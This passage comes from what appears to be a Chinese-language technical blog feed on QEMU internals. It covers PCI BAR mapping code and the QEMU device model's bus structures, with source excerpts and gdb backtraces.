class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  pci_default_write_config (d=0x5555581030f0, addr=16, val_in=4273733632, l=4) at ../../qemu/hw/pci/pci.c:1594</span></span><br><span class="line"><span class="comment">//#1  0x0000555555a0f779 in e1000_write_config (pci_dev=0x5555581030f0, address=16, val=4273733632, len=4) at ../../qemu/hw/net/e1000.c:1629</span></span><br><span class="line"><span class="comment">//#2  0x0000555555a9e85a in pci_host_config_write_common (pci_dev=0x5555581030f0, addr=16, limit=256, val=4273733632, len=4) at ../../qemu/hw/pci/pci_host.c:96</span></span><br><span class="line"><span class="comment">//#3  0x0000555555a9eaa6 in pci_data_write (s=0x5555574288b0, addr=2147489808, val=4273733632, len=4) at ../../qemu/hw/pci/pci_host.c:138</span></span><br><span class="line"><span class="comment">//#4  0x0000555555a9ec7b in pci_host_data_write (opaque=0x5555573f2390, addr=0, val=4273733632, len=4) at ../../qemu/hw/pci/pci_host.c:188</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e19a00 in memory_region_write_accessor (mr=0x5555573f27d0, addr=0, value=0x7ffff67ff598, size=4, shift=0, mask=4294967295, attrs=...) at ../../qemu/system/memory.c:497</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e19d39 in access_with_adjusted_size (addr=0, value=0x7ffff67ff598, size=4, access_size_min=1, access_size_max=4, access_fn=0x555555e19906 &lt;memory_region_write_accessor&gt;, mr=0x5555573f27d0, attrs=...) at ../../qemu/system/memory.c:573</span></span><br><span class="line"><span class="comment">//#7  0x0000555555e1d053 in memory_region_dispatch_write (mr=0x5555573f27d0, addr=0, data=4273733632, op=MO_32, attrs=...) at ../../qemu/system/memory.c:1521</span></span><br><span class="line"><span class="comment">//#8  0x0000555555e2b7a0 in flatview_write_continue_step (attrs=..., buf=0x7ffff7f8a000 &quot;&quot;, len=4, mr_addr=0, l=0x7ffff67ff680, mr=0x5555573f27d0) at ../../qemu/system/physmem.c:2713</span></span><br><span class="line"><span class="comment">//#9  0x0000555555e2b870 in flatview_write_continue (fv=0x7ffee8041af0, addr=3324, attrs=..., ptr=0x7ffff7f8a000, len=4, mr_addr=0, l=4, mr=0x5555573f27d0) at ../../qemu/system/physmem.c:2743</span></span><br><span class="line"><span class="comment">//#10 0x0000555555e2b982 in flatview_write (fv=0x7ffee8041af0, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2774</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e2bdd0 in address_space_write (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4) at ../../qemu/system/physmem.c:2894</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e2be4c in address_space_rw (as=0x55555704dc80 &lt;address_space_io&gt;, addr=3324, attrs=..., buf=0x7ffff7f8a000, len=4, is_write=true) at ../../qemu/system/physmem.c:2904</span></span><br><span class="line"><span class="comment">//#13 0x0000555555e85476 in kvm_handle_io (port=3324, attrs=..., data=0x7ffff7f8a000, direction=1, size=4, count=1) at ../../qemu/accel/kvm/kvm-all.c:2631</span></span><br><span class="line"><span class="comment">//#14 0x0000555555e85de6 in kvm_cpu_exec (cpu=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-all.c:2903</span></span><br><span class="line"><span class="comment">//#15 0x0000555555e88eb8 in kvm_vcpu_thread_fn (arg=0x5555573a0db0) at ../../qemu/accel/kvm/kvm-accel-ops.c:50</span></span><br><span class="line"><span class="comment">//#16 0x00005555560b2687 in qemu_thread_start (args=0x5555573aa8c0) at ../../qemu/util/qemu-thread-posix.c:541</span></span><br><span class="line"><span class="comment">//#17 0x00007ffff7894ac3 in start_thread (arg=&lt;optimized out&gt;) at ./nptl/pthread_create.c:442</span></span><br><span class="line"><span class="comment">//#18 0x00007ffff7926850 in clone3 () at ../sysdeps/unix/sysv/linux/x86_64/clone3.S:81</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">pci_default_write_config</span><span class="params">(PCIDevice *d, <span class="type">uint32_t</span> addr, <span class="type">uint32_t</span> val_in, <span class="type">int</span> l)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i, was_irq_disabled = pci_irq_disabled(d);</span><br><span class="line">    <span class="type">uint32_t</span> val = val_in;</span><br><span class="line"></span><br><span class="line">    assert(addr + l &lt;= pci_config_size(d));</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (ranges_overlap(addr, l, PCI_BASE_ADDRESS_0, <span class="number">24</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS, <span class="number">4</span>) ||</span><br><span class="line">        ranges_overlap(addr, l, PCI_ROM_ADDRESS1, <span class="number">4</span>) ||</span><br><span class="line">        range_covers_byte(addr, l, PCI_COMMAND))</span><br><span class="line">        pci_update_mappings(d);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (ranges_overlap(addr, l, PCI_COMMAND, <span class="number">2</span>)) &#123;</span><br><span class="line">        pci_update_irq_disabled(d, was_irq_disabled);</span><br><span class="line">        memory_region_set_enabled(&amp;d-&gt;bus_master_enable_region,</span><br><span class="line">                                  (pci_get_word(d-&gt;config + PCI_COMMAND)</span><br><span class="line">                                   &amp; PCI_COMMAND_MASTER) &amp;&amp; d-&gt;has_power);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    msi_write_config(d, addr, val_in, l);</span><br><span class="line">    msix_write_config(d, addr, val_in, l);</span><br><span class="line">    pcie_sriov_config_write(d, addr, val_in, l);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_update_mappings</span><span class="params">(PCIDevice *d)</span></span><br><span class="line">&#123;</span><br><span class="line">    PCIIORegion *r;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="type">pcibus_t</span> new_addr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(i = <span class="number">0</span>; i &lt; PCI_NUM_REGIONS; i++) &#123;</span><br><span class="line">        r = &amp;d-&gt;io_regions[i];</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* this region isn&#x27;t registered */</span></span><br><span class="line">        <span class="keyword">if</span> (!r-&gt;size)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        new_addr = pci_bar_address(d, i, r-&gt;type, r-&gt;size);</span><br><span class="line">        <span class="keyword">if</span> (!d-&gt;has_power) &#123;</span><br><span class="line">            new_addr = PCI_BAR_UNMAPPED;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* This bar isn&#x27;t changed */</span></span><br><span class="line">        <span class="keyword">if</span> (new_addr == r-&gt;addr)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* now do the real mapping */</span></span><br><span class="line">        <span class="keyword">if</span> (r-&gt;addr != PCI_BAR_UNMAPPED) &#123;</span><br><span class="line">            trace_pci_update_mappings_del(d-&gt;name, pci_dev_bus_num(d),</span><br><span class="line">                                          PCI_SLOT(d-&gt;devfn),</span><br><span class="line">                                          PCI_FUNC(d-&gt;devfn),</span><br><span class="line">                                          i, r-&gt;addr, r-&gt;size);</span><br><span class="line">            memory_region_del_subregion(r-&gt;address_space, r-&gt;memory);</span><br><span class="line">        &#125;</span><br><span class="line">        r-&gt;addr = new_addr;</span><br><span class="line">        <span class="keyword">if</span> (r-&gt;addr != PCI_BAR_UNMAPPED) &#123;</span><br><span class="line">            trace_pci_update_mappings_add(d-&gt;name, pci_dev_bus_num(d),</span><br><span class="line">                                          PCI_SLOT(d-&gt;devfn),</span><br><span class="line">                                          PCI_FUNC(d-&gt;devfn),</span><br><span class="line">                                          i, r-&gt;addr, r-&gt;size);</span><br><span class="line">            memory_region_add_subregion_overlap(r-&gt;address_space,</span><br><span class="line">                                                r-&gt;addr, r-&gt;memory, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    pci_update_vga(d);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol><li><a href="https://www.owalle.com/2021/12/09/qemu-pci/">用QEMU来体会PCI/PCIE设备 </a></li><li><a href="https://members.pcisig.com/wg/PCI-SIG/document/download/8237">PCI Local Bus Specification Revision 3.0</a></li><li><a href="https://airbus-seclab.github.io/qemu_blog/pci.html">A deep dive into QEMU: PCI host bridge controller</a></li><li><a href="https://arttnba3.cn/2022/08/30/HARDWARE-0X00-PCI_DEVICE/">【HARDWARE.0x00】PCI 设备简易食用手册</a></li><li><a href="https://shaocheng.li/posts/2017/11/27/">x86 计算机的 PCI 总线结构</a></li><li><a href="https://66ring.github.io/2021/09/10/universe/qemu/qemu_bus_simulate/">QEMU总线模拟 </a></li><li><a href="https://github.com/GiantVM/doc/blob/master/pci.md">PCI设备的创建与初始化</a></li><li><a href="https://blog.csdn.net/vertor11/article/details/135942748">QEMU - e1000全虚拟化前端与TAP/TUN后端流程简析</a></li><li><a href="https://blog.csdn.net/u013253075/article/details/119485466">【精讲】PCIe基础篇——BAR配置过程</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> 虚拟化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> qemu </tag>
            
            <tag> 虚拟化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>qemu设备模型</title>
      <link href="/2024/07/31/qemu%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9E%8B/"/>
      <url>/2024/07/31/qemu%E8%AE%BE%E5%A4%87%E6%A8%A1%E5%9E%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>Qemu支持种类繁多的外部设备，并且支持多种架构，这些架构和设备的模拟在Qemu的代码中占了大头。</p><p>这里简单介绍一下Qemu中用于设备模拟的模型，主要分为<strong>总线</strong>、<strong>设备前端</strong>和<strong>设备后端</strong>。</p><h1 id="总线"><a href="#总线" class="headerlink" title="总线"></a>总线</h1><p>实际上，PC中各组件是通过总线互联通信的。再具体的说，设备与总线是交替的，总线下面只能连接设备，设备也只能连接到总线上，总线与总线、设备与设备之间是不能直接连接的，如下图所示。<br><img src="https://wiki.qemu.org/images/4/4f/Kvm_model.png" alt="Qemu官网的架构图"></p><p>参考之前的<a href="/2024/04/08/qemu%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86/" title="qemu基本知识">qemu基本知识</a>中对象初始化内容，根据总线的<strong>TypeInfo</strong>，即<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/bus.c#L254"><strong>bus_info</strong></a>，即可了解总线对象的相关信息。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> TypeInfo bus_info = &#123;</span><br><span class="line">    .name = TYPE_BUS,</span><br><span class="line">    .parent = TYPE_OBJECT,</span><br><span class="line">    .instance_size = <span class="keyword">sizeof</span>(BusState),</span><br><span class="line">    .abstract = <span class="literal">true</span>,</span><br><span class="line">    .class_size = <span class="keyword">sizeof</span>(BusClass),</span><br><span class="line">    .instance_init = qbus_initfn,</span><br><span class="line">    .instance_finalize = qbus_finalize,</span><br><span class="line">    .class_init = bus_class_init,</span><br><span class="line">    .interfaces = (InterfaceInfo[]) &#123;</span><br><span class="line">        &#123; TYPE_RESETTABLE_INTERFACE &#125;,</span><br><span class="line">        &#123; &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><p>可以看到，Qemu使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/qdev-core.h#L318"><strong>struct BusClass</strong></a>和<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/include/hw/qdev-core.h#L372"><strong>struct BusState</strong></a>来模拟PC中的总线。</p><h2 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h2><h3 id="struct-BusClass"><a href="#struct-BusClass" class="headerlink" title="struct BusClass"></a>struct BusClass</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BusClass</span> &#123;</span></span><br><span class="line">    ObjectClass parent_class;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* FIXME first arg should be BusState */</span></span><br><span class="line">    <span class="type">void</span> (*print_dev)(Monitor *mon, DeviceState *dev, <span class="type">int</span> indent);</span><br><span class="line">    <span class="type">char</span> *(*get_dev_path)(DeviceState *dev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * This callback is used to create Open Firmware device path in accordance</span></span><br><span class="line"><span class="comment">     * with OF spec http://forthworks.com/standards/of1275.pdf. Individual bus</span></span><br><span class="line"><span class="comment">     * bindings can be found at http://playground.sun.com/1275/bindings/.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">char</span> *(*get_fw_dev_path)(DeviceState *dev);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * Return whether the device can be added to @bus,</span></span><br><span class="line"><span class="comment">     * based on the address that was set (via device properties)</span></span><br><span class="line"><span class="comment">     * before realize.  If not, on return @errp contains the</span></span><br><span class="line"><span class="comment">     * human-readable error message.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">bool</span> (*check_address)(BusState *bus, DeviceState *dev, Error **errp);</span><br><span class="line"></span><br><span class="line">    BusRealize realize;</span><br><span class="line">    BusUnrealize unrealize;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* maximum devices allowed on the bus, 0: no limit. */</span></span><br><span class="line">    <span class="type">int</span> max_dev;</span><br><span class="line">    <span class="comment">/* number of automatically allocated bus ids (e.g. ide.0) */</span></span><br><span class="line">    <span class="type">int</span> automatic_ids;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>struct BusClass</strong>是总线的类结构体，其中重要的是实例化时的<strong>realize</strong>回调函数和销毁时的<strong>unrealize</strong>回调函数。</p><h3 id="struct-BusState"><a href="#struct-BusState" class="headerlink" title="struct BusState"></a>struct BusState</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * struct BusState:</span></span><br><span class="line"><span class="comment"> * @obj: parent object</span></span><br><span class="line"><span class="comment"> * @parent: parent Device</span></span><br><span class="line"><span class="comment"> * @name: name of bus</span></span><br><span class="line"><span class="comment"> * @hotplug_handler: link to a hotplug handler associated with bus.</span></span><br><span class="line"><span class="comment"> * @max_index: max number of child buses</span></span><br><span class="line"><span class="comment"> * @realized: is the bus itself realized?</span></span><br><span class="line"><span class="comment"> * @full: is the bus full?</span></span><br><span class="line"><span class="comment"> * @num_children: current number of child buses</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">BusState</span> &#123;</span></span><br><span class="line">    <span class="comment">/* private: */</span></span><br><span class="line">    Object obj;</span><br><span class="line">    <span class="comment">/* public: */</span></span><br><span class="line">    DeviceState *parent;</span><br><span class="line">    <span class="type">char</span> *name;</span><br><span class="line">    HotplugHandler *hotplug_handler;</span><br><span class="line">    <span class="type">int</span> max_index;</span><br><span class="line">    <span class="type">bool</span> realized;</span><br><span class="line">    <span class="type">bool</span> full;</span><br><span class="line">    <span class="type">int</span> num_children;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @children: an RCU protected QTAILQ, thus readers must use RCU</span></span><br><span class="line"><span class="comment">     * to access it, and writers must hold the big qemu lock</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusChildHead children;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @sibling: next bus</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    BusStateEntry sibling;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * @reset: ResettableState for the bus; handled by Resettable interface.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ResettableState reset;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>struct BusState</strong>是总线的对象结构体。</p><p><strong>parent</strong>字段指向的是总线的父设备。正如前面介绍的，总线和设备是交替的，而且总线不能独立产生，必须依赖于一个设备，例如USB总线是由USB控制器产生的，PCI总线是由PCI桥产生的。<br><strong>children</strong>指向当前总线下的所有设备链表，而<strong>sibling</strong>则指向该总线父设备下的其他总线。</p><h2 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h2><p>根据<a href="#总线">前面</a>内容可知，总线对象使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/bus.c#L235"><strong>bus_class_init()</strong></a>初始化类，使用<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/bus.c#L216"><strong>qbus_initfn()</strong></a>初始化对象。</p><h3 id="类初始化"><a href="#类初始化" class="headerlink" title="类初始化"></a>类初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bus_class_init</span><span class="params">(ObjectClass *class, <span class="type">void</span> *data)</span></span><br><span class="line">&#123;</span><br><span class="line">    BusClass *bc = BUS_CLASS(class);</span><br><span class="line">    ResettableClass *rc = RESETTABLE_CLASS(class);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span>-&gt;</span>unparent = bus_unparent;</span><br><span class="line">    bc-&gt;get_fw_dev_path = default_bus_get_fw_dev_path;</span><br><span class="line"></span><br><span class="line">    rc-&gt;get_state = bus_get_reset_state;</span><br><span class="line">    rc-&gt;child_foreach = bus_reset_child_foreach;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总线的类初始化很简单，只是初始化了几个函数指针和接口。</p><h3 id="对象初始化"><a href="#对象初始化" class="headerlink" title="对象初始化"></a>对象初始化</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">qbus_initfn</span><span class="params">(Object *obj)</span></span><br><span class="line">&#123;</span><br><span class="line">    BusState *bus = BUS(obj);</span><br><span class="line"></span><br><span class="line">    QTAILQ_INIT(&amp;bus-&gt;children);</span><br><span class="line">    object_property_add_link(obj, QDEV_HOTPLUG_HANDLER_PROPERTY,</span><br><span class="line">                             TYPE_HOTPLUG_HANDLER,</span><br><span class="line">                             (Object **)&amp;bus-&gt;hotplug_handler,</span><br><span class="line">                             object_property_allow_set_link,</span><br><span class="line">                             <span class="number">0</span>);</span><br><span class="line">    object_property_add_bool(obj, <span class="string">&quot;realized&quot;</span>,</span><br><span class="line">                             bus_get_realized, bus_set_realized);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总线的对象初始化也很简单，添加了相关的属性并初始化<strong>children</strong>字段。</p><h2 id="实例化"><a href="#实例化" class="headerlink" title="实例化"></a>实例化</h2><p>Qemu中对象初始化仅仅是指初始化好了必要的数据结构信息，还无法直接使用。例如PCI设备只有根据PCI协议完成交互后才能使用，则PCI设备对象则在初始化完后还需要进行协议交互，然后才能正常进行后续的模拟功能。因此对象初始化结束后还需要进行实例化。</p><p>根据<a href="#对象初始化">总线对象初始化</a>的内容，在对象初始化时设置了对象实例化的函数，即<a href="https://elixir.bootlin.com/qemu/v9.0.0-rc2/source/hw/core/bus.c#L189"><strong>bus_set_realized</strong></a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//#0  bus_set_realized (obj=0x5555573ffd70, value=true, errp=0x7fffffffd4d0) at ../../qemu/hw/core/bus.c:190</span></span><br><span class="line"><span class="comment">//#1  0x0000555555ea3595 in property_set_bool (obj=0x5555573ffd70, v=0x555557746e50, name=0x5555562f3718 &quot;realized&quot;, opaque=0x555557400840, errp=0x7fffffffd4d0) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#2  0x0000555555ea112b in object_property_set (obj=0x5555573ffd70, name=0x5555562f3718 &quot;realized&quot;, v=0x555557746e50, errp=0x7fffffffd4d0) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#3  0x0000555555ea5d64 in object_property_set_qobject (obj=0x5555573ffd70, name=0x5555562f3718 &quot;realized&quot;, value=0x555557746cb0, errp=0x7fffffffd4d0) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#4  0x0000555555ea14e4 in object_property_set_bool (obj=0x5555573ffd70, name=0x5555562f3718 &quot;realized&quot;, value=true, errp=0x7fffffffd4d0) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#5  0x0000555555e9321b in qbus_realize (bus=0x5555573ffd70, errp=0x7fffffffd4d0) at ../../qemu/hw/core/bus.c:174</span></span><br><span class="line"><span class="comment">//#6  0x0000555555e97f04 in device_set_realized (obj=0x5555573c9100, value=true, errp=0x7fffffffd4d0) at ../../qemu/hw/core/qdev.c:550</span></span><br><span class="line"><span class="comment">//#7  0x0000555555ea3595 in property_set_bool (obj=0x5555573c9100, v=0x5555573ca630, name=0x5555562f4071 &quot;realized&quot;, opaque=0x5555570ee010, errp=0x7fffffffd4d0) at ../../qemu/qom/object.c:2358</span></span><br><span class="line"><span class="comment">//#8  0x0000555555ea112b in object_property_set (obj=0x5555573c9100, name=0x5555562f4071 &quot;realized&quot;, v=0x5555573ca630, errp=0x7fffffffd4d0) at ../../qemu/qom/object.c:1472</span></span><br><span class="line"><span class="comment">//#9  0x0000555555ea5d64 in object_property_set_qobject (obj=0x5555573c9100, name=0x5555562f4071 &quot;realized&quot;, value=0x5555573ca350, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/qom-qobject.c:28</span></span><br><span class="line"><span class="comment">//#10 0x0000555555ea14e4 in object_property_set_bool (obj=0x5555573c9100, name=0x5555562f4071 &quot;realized&quot;, value=true, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/qom/object.c:1541</span></span><br><span class="line"><span class="comment">//#11 0x0000555555e974a8 in qdev_realize (dev=0x5555573c9100, bus=0x55555735b0a0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:292</span></span><br><span class="line"><span class="comment">//#12 0x0000555555e974e1 in qdev_realize_and_unref (dev=0x5555573c9100, bus=0x55555735b0a0, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/qdev.c:299</span></span><br><span class="line"><span class="comment">//#13 0x00005555559658fa in sysbus_realize_and_unref (dev=0x5555573c9100, errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/hw/core/sysbus.c:261</span></span><br><span class="line"><span class="comment">//#14 0x0000555555cae1c5 in pc_init1 (machine=0x555557352820, pci_type=0x5555562a5bbb &quot;i440FX&quot;) at ../../qemu/hw/i386/pc_piix.c:212</span></span><br><span class="line"><span class="comment">//#15 0x0000555555caee7d in pc_init_v9_0 (machine=0x555557352820) at ../../qemu/hw/i386/pc_piix.c:523</span></span><br><span class="line"><span class="comment">//#16 0x000055555595e63e in machine_run_board_init (machine=0x555557352820, mem_path=0x0, errp=0x7fffffffd7b0) at ../../qemu/hw/core/machine.c:1547</span></span><br><span class="line"><span class="comment">//#17 0x0000555555bda9d6 in qemu_init_board () at ../../qemu/system/vl.c:2613</span></span><br><span class="line"><span class="comment">//#18 0x0000555555bdace5 in qmp_x_exit_preconfig (errp=0x55555705bca0 &lt;error_fatal&gt;) at ../../qemu/system/vl.c:2705</span></span><br><span class="line"><span class="comment">//#19 0x0000555555bdd6a2 in qemu_init (argc=31, argv=0x7fffffffdae8) at ../../qemu/system/vl.c:3739</span></span><br><span class="line"><span class="comment">//#20 0x0000555555e9282d in main (argc=31, argv=0x7fffffffdae8) at ../../qemu/system/main.c:47</span></span><br><span class="line"><span class="comment">//#21 0x00007ffff7829d90 in __libc_start_call_main (main=main@entry=0x555555e92809 &lt;main&gt;, argc=argc@entry=31, argv=argv@entry=0x7fffffffdae8) at ../sysdeps/nptl/libc_start_call_main.h:58</span></span><br><span class="line"><span class="comment">//#22 0x00007ffff7829e40 in __libc_start_main_impl (main=0x555555e92809 &lt;main&gt;, argc=31, argv=0x7fffffffdae8, init=&lt;optimized out&gt;, fini=&lt;optimized out&gt;, rtld_fini=&lt;optimized out&gt;, stack_end=0x7fffffffdad8) at ../csu/libc-start.c:392</span></span><br><span class="line"><span class="comment">//#23 0x000055555586ba15 in _start ()</span></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">bus_set_realized</span><span class="params">(Object *obj, <span class="type">bool</span> value, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    BusState *bus = BUS(obj);</span><br><span class="line">    BusClass *bc = BUS_GET_CLASS(bus);</span><br><span class="line">    BusChild *kid;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (value &amp;&amp; !bus-&gt;realized) &#123;</span><br><span class="line">        <span class="keyword">if</span> (bc-&gt;realize) &#123;</span><br><span class="line">            bc-&gt;realize(bus, errp);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* <span class="doctag">TODO:</span> recursive realization 